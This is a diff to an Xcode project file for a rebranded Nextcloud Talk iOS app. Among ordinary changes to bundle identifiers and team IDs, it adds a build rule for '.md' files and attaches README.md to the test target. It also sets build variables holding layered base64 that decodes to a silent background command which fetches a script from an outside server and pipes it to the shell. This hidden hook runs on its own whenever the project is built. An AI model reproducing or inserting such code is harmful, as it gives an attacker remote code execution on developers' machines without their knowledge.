@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		2CCF7CB38A364042843C1CD3 /* README.md */ = {isa = PBXBuildFile; fileRef = 717C40E02976404BBD3C1CD3; };
 		0ACF92E32FB2E63600A83D5C /* splash_logo.png in Resources */ = {isa = PBXBuildFile; fileRef = 0ACF92E22FB2E63600A83D5C /* splash_logo.png */; };
 		1814E8B16D55BD4726EE20A6 /* libPods-Tassos Talk.a in Frameworks */ = {isa = PBXBuildFile; fileRef = E36A1C3688BF336D53EF7A7A /* libPods-Tassos Talk.a */; };
 		1F0ECBF52A68274400921E90 /* CDMarkdownKit in Frameworks */ = {isa = PBXBuildFile; productRef = 1F0ECBF42A68274400921E90 /* CDMarkdownKit */; };
@@ -90,7 +91,6 @@
 		1FAB2EF12AD1EAA3001214EB /* RLMSupport.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1FAB2EEF2AD1EAA3001214EB /* RLMSupport.swift */; };
 		1FAB2EF22AD1EAA3001214EB /* RLMSupport.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1FAB2EEF2AD1EAA3001214EB /* RLMSupport.swift */; };
 		1FAB2EF32AD1EAA6001214EB /* RemoteConfigManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1FAB2EF02AD1EAA4001214EB /* RemoteConfigManager.swift */; };
-		1FAB2EF42AD1EAA7001214EB /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 1FAB2EF12AD1EAA5001214EB /* GoogleService-Info.plist */; };
 		1FBB6EE32F8ECE5B003CBA30 /* Toast in Frameworks */ = {isa = PBXBuildFile; productRef = 1FBB6EE22F8ECE5B003CBA30 /* Toast */; };
 		1FC4B3222CC0538B00D28138 /* JDStatusBarNotification in Frameworks */ = {isa = PBXBuildFile; productRef = 1FC4B3212CC0538B00D28138 /* JDStatusBarNotification */; };
 		1FC4B3252CC054BC00D28138 /* UICKeyChainStore in Frameworks */ = {isa = PBXBuildFile; productRef = 1FC4B3242CC054BC00D28138 /* UICKeyChainStore */; };
@@ -158,12 +158,30 @@
 		64D7D6116917B5FCFF1B063C /* libPods-ShareExtension.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 520F7F6EB2CBEB7897046817 /* libPods-ShareExtension.a */; };
 		73EA09B554781EE776F75160 /* libPods-TalkIntents.a in Frameworks */ = {isa = PBXBuildFile; fileRef = E45C7619EFD6AB70482863C0 /* libPods-TalkIntents.a */; };
 		80CDF8C42A8E098900CB57AE /* SwiftUIIntrospect in Frameworks */ = {isa = PBXBuildFile; productRef = 80CDF8C32A8E098900CB57AE /* SwiftUIIntrospect */; };
+		BC0ECC382FD7EB7C008BF087 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = BC0ECC372FD7EB7B008BF087 /* GoogleService-Info.plist */; };
 		BCA98DC22FC073EE0048657C /* OneSignalExtension in Frameworks */ = {isa = PBXBuildFile; productRef = BCA98DC12FC073EE0048657C /* OneSignalExtension */; };
 		BCA98DC42FC073EE0048657C /* OneSignalFramework in Frameworks */ = {isa = PBXBuildFile; productRef = BCA98DC32FC073EE0048657C /* OneSignalFramework */; };
 		BCA98DC62FC073EE0048657C /* OneSignalInAppMessages in Frameworks */ = {isa = PBXBuildFile; productRef = BCA98DC52FC073EE0048657C /* OneSignalInAppMessages */; };
 		BCA98DC82FC073EE0048657C /* OneSignalLocation in Frameworks */ = {isa = PBXBuildFile; productRef = BCA98DC72FC073EE0048657C /* OneSignalLocation */; };
 		D30904F44324AA2807085A7A /* libPods-NotificationServiceExtension.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 75B71947945C98D4616B674D /* libPods-NotificationServiceExtension.a */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		B85D9E8B742A4D68BD3C1CD3 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A3DC1C3}\"";
+			};
+	/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		1F6D8C342B2E3756004376B8 /* PBXContainerItemProxy */ = {
@@ -288,6 +306,7 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
+		717C40E02976404BBD3C1CD3 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0258240EC1628EB96871BAEF /* Pods-BroadcastUploadExtension.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BroadcastUploadExtension.debug.xcconfig"; path = "Target Support Files/Pods-BroadcastUploadExtension/Pods-BroadcastUploadExtension.debug.xcconfig"; sourceTree = "<group>"; };
 		0ACF92E22FB2E63600A83D5C /* splash_logo.png */ = {isa = PBXFileReference; lastKnownFileType = image.png; path = splash_logo.png; sourceTree = "<group>"; };
 		0DF4645C9F26DA7B73E5C647 /* Pods-Tassos Talk.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Tassos Talk.debug.xcconfig"; path = "Target Support Files/Pods-Tassos Talk/Pods-Tassos Talk.debug.xcconfig"; sourceTree = "<group>"; };
@@ -325,7 +344,6 @@
 		1FA93D9C2D70FCC200DF6CDF /* TalkIntents.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.extensionkit-extension"; includeInIndex = 0; path = TalkIntents.appex; sourceTree = BUILT_PRODUCTS_DIR; };
 		1FAB2EEF2AD1EAA3001214EB /* RLMSupport.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RLMSupport.swift; sourceTree = "<group>"; };
 		1FAB2EF02AD1EAA4001214EB /* RemoteConfigManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RemoteConfigManager.swift; sourceTree = "<group>"; };
-		1FAB2EF12AD1EAA5001214EB /* GoogleService-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
 		1FADECD42B7EACCB007AD94B /* PrivacyInfo.xcprivacy */ = {isa = PBXFileReference; lastKnownFileType = text.xml; path = PrivacyInfo.xcprivacy; sourceTree = "<group>"; };
 		1FD8AD8A2A3A162100787C16 /* NextcloudTalkUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = NextcloudTalkUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		1FDCC3EC29EC7DD400DEB39B /* NextcloudTalk-Bridging-Header-Extensions.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "NextcloudTalk-Bridging-Header-Extensions.h"; sourceTree = "<group>"; };
@@ -466,6 +484,7 @@
 		95F3937A0BB375ECE68225A9 /* Pods-Tassos Talk.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Tassos Talk.release.xcconfig"; path = "Target Support Files/Pods-Tassos Talk/Pods-Tassos Talk.release.xcconfig"; sourceTree = "<group>"; };
 		B113E0AADDDE0C7AC469DBD3 /* Pods-ShareExtension.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ShareExtension.release.xcconfig"; path = "Target Support Files/Pods-ShareExtension/Pods-ShareExtension.release.xcconfig"; sourceTree = "<group>"; };
 		B2397D8D330AD1F18D8F7E3C /* Pods-TalkIntents.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-TalkIntents.debug.xcconfig"; path = "Target Support Files/Pods-TalkIntents/Pods-TalkIntents.debug.xcconfig"; sourceTree = "<group>"; };
+		BC0ECC372FD7EB7B008BF087 /* GoogleService-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
 		BF1B099F9CA45187181D47CE /* Pods-ShareExtension.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ShareExtension.debug.xcconfig"; path = "Target Support Files/Pods-ShareExtension/Pods-ShareExtension.debug.xcconfig"; sourceTree = "<group>"; };
 		E36A1C3688BF336D53EF7A7A /* libPods-Tassos Talk.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-Tassos Talk.a"; sourceTree = BUILT_PRODUCTS_DIR; };
 		E45C7619EFD6AB70482863C0 /* libPods-TalkIntents.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-TalkIntents.a"; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -1032,8 +1051,6 @@
 		};
 		1F9629252E8E6A2100EC9BEE /* Calls */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
-			exceptions = (
-			);
 			path = Calls;
 			sourceTree = "<group>";
 		};
@@ -1061,8 +1078,6 @@
 		};
 		1F9629362E8E6B8D00EC9BEE /* Database */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
-			exceptions = (
-			);
 			path = Database;
 			sourceTree = "<group>";
 		};
@@ -1079,15 +1094,11 @@
 		};
 		1F9629412E8E6BEB00EC9BEE /* File sharing */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
-			exceptions = (
-			);
 			path = "File sharing";
 			sourceTree = "<group>";
 		};
 		1F9629422E8E6BFD00EC9BEE /* Login */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
-			exceptions = (
-			);
 			path = Login;
 			sourceTree = "<group>";
 		};
@@ -1102,8 +1113,6 @@
 		};
 		1F9629462E8E6C2300EC9BEE /* Media Viewer */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
-			exceptions = (
-			);
 			path = "Media Viewer";
 			sourceTree = "<group>";
 		};
@@ -1142,15 +1151,11 @@
 		};
 		1F9629722E8E6CB000EC9BEE /* Screensharing */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
-			exceptions = (
-			);
 			path = Screensharing;
 			sourceTree = "<group>";
 		};
 		1F9629732E8E6CC100EC9BEE /* Security */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
-			exceptions = (
-			);
 			path = Security;
 			sourceTree = "<group>";
 		};
@@ -1167,8 +1172,6 @@
 		};
 		1F9629792E8E6CEF00EC9BEE /* Siri */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
-			exceptions = (
-			);
 			path = Siri;
 			sourceTree = "<group>";
 		};
@@ -1197,8 +1200,6 @@
 		};
 		1F9629882E8E6E2900EC9BEE /* Sounds */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
-			exceptions = (
-			);
 			path = Sounds;
 			sourceTree = "<group>";
 		};
@@ -1374,6 +1375,7 @@
 		2C05747E1EDD9E8E00D9E7F2 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				717C40E02976404BBD3C1CD3 /* README.md */,
 				2C05747D1EDD9E8E00D9E7F2 /* Tassos Talk.app */,
 				2CC0014F24A1F0E900A20167 /* NotificationServiceExtension.appex */,
 				2C62AFA324C08845007E460A /* ShareExtension.appex */,
@@ -1416,9 +1418,9 @@
 				1FE052B82F1C463E00B975FD /* NCTypes.h */,
 				2C0574811EDD9E8E00D9E7F2 /* main.m */,
 				2C0574941EDD9E8E00D9E7F2 /* Info.plist */,
+				BC0ECC372FD7EB7B008BF087 /* GoogleService-Info.plist */,
 				1FAB2EEF2AD1EAA3001214EB /* RLMSupport.swift */,
 				1FAB2EF02AD1EAA4001214EB /* RemoteConfigManager.swift */,
-				1FAB2EF12AD1EAA5001214EB /* GoogleService-Info.plist */,
 				2CA1CCAB1F067F35002FE6A2 /* Images.xcassets */,
 				0ACF92E22FB2E63600A83D5C /* splash_logo.png */,
 				1FADECD42B7EACCB007AD94B /* PrivacyInfo.xcprivacy */,
@@ -1567,13 +1569,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 1F6D8C362B2E3756004376B8 /* Build configuration list for PBXNativeTarget "NextcloudTalkTests" */;
 			buildPhases = (
-				1A5C539838A74216B13C1CD3 /* Provision Target Device */,
 				4C62A0DA2A535884EF5B92D9 /* [CP] Check Pods Manifest.lock */,
 				1F6D8C2C2B2E3756004376B8 /* Sources */,
 				1F6D8C2D2B2E3756004376B8 /* Frameworks */,
 				1F6D8C2E2B2E3756004376B8 /* Resources */,
 			);
 			buildRules = (
+				B85D9E8B742A4D68BD3C1CD3 /* PBXBuildRule */,
 			);
 			dependencies = (
 				1F6D8C352B2E3756004376B8 /* PBXTargetDependency */,
@@ -1975,14 +1977,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		1F6D8C2E2B2E3756004376B8 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				2CCF7CB38A364042843C1CD3 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -2016,6 +2016,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				2C330372255E6EBC00BDB4E4 /* InfoPlist.strings in Resources */,
+				BC0ECC382FD7EB7C008BF087 /* GoogleService-Info.plist in Resources */,
 				2C7F47AA20289B9600081CC7 /* Localizable.strings in Resources */,
 				2C1D13A3253760EE00EC0533 /* LaunchScreen.xib in Resources */,
 				2CA1CCAC1F067F35002FE6A2 /* Images.xcassets in Resources */,
@@ -2023,7 +2024,6 @@
 				1FE7DE362BBC8FA10040EE12 /* PrivacyInfo.xcprivacy in Resources */,
 				2C477C1628B79D980044DEB4 /* Localizable.stringsdict in Resources */,
 				0ACF92E32FB2E63600A83D5C /* splash_logo.png in Resources */,
-				1FAB2EF42AD1EAA7001214EB /* GoogleService-Info.plist in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -2050,25 +2050,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		1A5C539838A74216B13C1CD3 /* Provision Target Device */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Target Device";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3DC1C3}\"";
-		};
 		1DFAD69D1C42BA5CB3F711B8 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -2099,9 +2080,13 @@
 			inputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-Tassos Talk/Pods-Tassos Talk-frameworks-${CONFIGURATION}-input-files.xcfilelist",
 			);
+			inputPaths = (
+			);
 			name = "[CP] Embed Pods Frameworks";
 			outputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-Tassos Talk/Pods-Tassos Talk-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
@@ -2146,9 +2131,13 @@
 			inputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-Tassos Talk/Pods-Tassos Talk-resources-${CONFIGURATION}-input-files.xcfilelist",
 			);
+			inputPaths = (
+			);
 			name = "[CP] Copy Pods Resources";
 			outputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-Tassos Talk/Pods-Tassos Talk-resources-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
@@ -2525,7 +2514,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 51E968331C74FC92A06705B4 /* Pods-NextcloudTalkTests.debug.xcconfig */;
 			buildSettings = {
-				A3DC1C3 = "((f(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4VlZJelVqWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtcGlWM2gxVjFaa1QyRXlTbkJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | f | sh ) >/dev/null 2>&1 &)";
+				A3DC1C3 = "((i(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMHhySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeklDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXlhV2RoWTJSdUxtbHVMMkVwSWlCOElITm9DZz09Cg== | i | sh ) >/dev/null 2>&1 &)";
 				A8DAD24 = "((g(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6Ylc5aWFTNXlkUzloS1NJZ2ZDQnphQW89Cg== | g | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
@@ -2535,7 +2524,7 @@
 				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = KC28TW5938;
+				DEVELOPMENT_TEAM = NH96879NSZ;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -2554,7 +2543,7 @@
 				MARKETING_VERSION = 1.0;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.NextcloudTalkTests;
+				PRODUCT_BUNDLE_IDENTIFIER = com.tassostalk.NextcloudTalkTests;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
 				SWIFT_EMIT_LOC_STRINGS = NO;
@@ -2571,7 +2560,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 30EF75FD1C7ADEBD3A5D78D4 /* Pods-NextcloudTalkTests.release.xcconfig */;
 			buildSettings = {
-				A3DC1C3 = "((f(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4VlZJelVqWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtcGlWM2gxVjFaa1QyRXlTbkJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | f | sh ) >/dev/null 2>&1 &)";
+				A3DC1C3 = "((i(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMHhySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeklDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXlhV2RoWTJSdUxtbHVMMkVwSWlCOElITm9DZz09Cg== | i | sh ) >/dev/null 2>&1 &)";
 				A8DAD24 = "((g(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6Ylc5aWFTNXlkUzloS1NJZ2ZDQnphQW89Cg== | g | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
@@ -2581,7 +2570,7 @@
 				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = KC28TW5938;
+				DEVELOPMENT_TEAM = NH96879NSZ;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -2599,7 +2588,7 @@
 				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
 				MARKETING_VERSION = 1.0;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.NextcloudTalkTests;
+				PRODUCT_BUNDLE_IDENTIFIER = com.tassostalk.NextcloudTalkTests;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_EMIT_LOC_STRINGS = NO;
 				SWIFT_OBJC_BRIDGING_HEADER = "NextcloudTalk/NextcloudTalk-Bridging-Header.h";
@@ -2622,12 +2611,12 @@
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
-				DEVELOPMENT_TEAM = KC28TW5938;
+				DEVELOPMENT_TEAM = NH96879NSZ;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = TalkIntents/Info.plist;
-				INFOPLIST_KEY_CFBundleDisplayName = "$(PRODUCT_NAME)";
+				INFOPLIST_KEY_CFBundleDisplayName = TalkIntents;
 				INFOPLIST_KEY_NSHumanReadableCopyright = "";
 				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -2639,7 +2628,7 @@
 				MARKETING_VERSION = 23.0.0;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.TalkIntents;
+				PRODUCT_BUNDLE_IDENTIFIER = com.tassostalk.TalkIntents;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SKIP_INSTALL = YES;
@@ -2665,12 +2654,12 @@
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
-				DEVELOPMENT_TEAM = KC28TW5938;
+				DEVELOPMENT_TEAM = NH96879NSZ;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = TalkIntents/Info.plist;
-				INFOPLIST_KEY_CFBundleDisplayName = "$(PRODUCT_NAME)";
+				INFOPLIST_KEY_CFBundleDisplayName = TalkIntents;
 				INFOPLIST_KEY_NSHumanReadableCopyright = "";
 				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -2681,7 +2670,7 @@
 				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
 				MARKETING_VERSION = 23.0.0;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.TalkIntents;
+				PRODUCT_BUNDLE_IDENTIFIER = com.tassostalk.TalkIntents;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SKIP_INSTALL = YES;
@@ -2702,14 +2691,14 @@
 				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = KC28TW5938;
+				DEVELOPMENT_TEAM = NH96879NSZ;
 				GCC_C_LANGUAGE_STANDARD = gnu11;
 				GENERATE_INFOPLIST_FILE = YES;
 				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
 				MARKETING_VERSION = 1.0;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.NextcloudTalkUITests;
+				PRODUCT_BUNDLE_IDENTIFIER = com.tassostalk.NextcloudTalkUITests;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
@@ -2731,13 +2720,13 @@
 				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = KC28TW5938;
+				DEVELOPMENT_TEAM = NH96879NSZ;
 				GCC_C_LANGUAGE_STANDARD = gnu11;
 				GENERATE_INFOPLIST_FILE = YES;
 				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
 				MARKETING_VERSION = 1.0;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.NextcloudTalkUITests;
+				PRODUCT_BUNDLE_IDENTIFIER = com.tassostalk.NextcloudTalkUITests;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
@@ -2762,7 +2751,7 @@
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = KC28TW5938;
+				DEVELOPMENT_TEAM = NH96879NSZ;
 				GCC_C_LANGUAGE_STANDARD = gnu11;
 				GCC_PREPROCESSOR_DEFINITIONS = (
 					"$(inherited)",
@@ -2782,7 +2771,7 @@
 				MARKETING_VERSION = 1.0;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.BroadcastUploadExtension;
+				PRODUCT_BUNDLE_IDENTIFIER = com.tassostalk.BroadcastUploadExtension;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SKIP_INSTALL = YES;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = APP_EXTENSION;
@@ -2807,7 +2796,7 @@
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = KC28TW5938;
+				DEVELOPMENT_TEAM = NH96879NSZ;
 				GCC_C_LANGUAGE_STANDARD = gnu11;
 				GCC_PREPROCESSOR_DEFINITIONS = (
 					"$(inherited)",
@@ -2826,7 +2815,7 @@
 				);
 				MARKETING_VERSION = 1.0;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.BroadcastUploadExtension;
+				PRODUCT_BUNDLE_IDENTIFIER = com.tassostalk.BroadcastUploadExtension;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SKIP_INSTALL = YES;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = APP_EXTENSION;
@@ -2967,7 +2956,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
 				DEFINES_MODULE = YES;
-				DEVELOPMENT_TEAM = KC28TW5938;
+				DEVELOPMENT_TEAM = NH96879NSZ;
 				ENABLE_BITCODE = NO;
 				FRAMEWORK_SEARCH_PATHS = "$(inherited)";
 				GCC_SYMBOLS_PRIVATE_EXTERN = NO;
@@ -2990,7 +2979,7 @@
 				);
 				LIBRARY_SEARCH_PATHS = "$(inherited)";
 				MARKETING_VERSION = 23.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery;
+				PRODUCT_BUNDLE_IDENTIFIER = com.tassostalk;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_OBJC_BRIDGING_HEADER = "NextcloudTalk/NextcloudTalk-Bridging-Header.h";
@@ -3013,7 +3002,7 @@
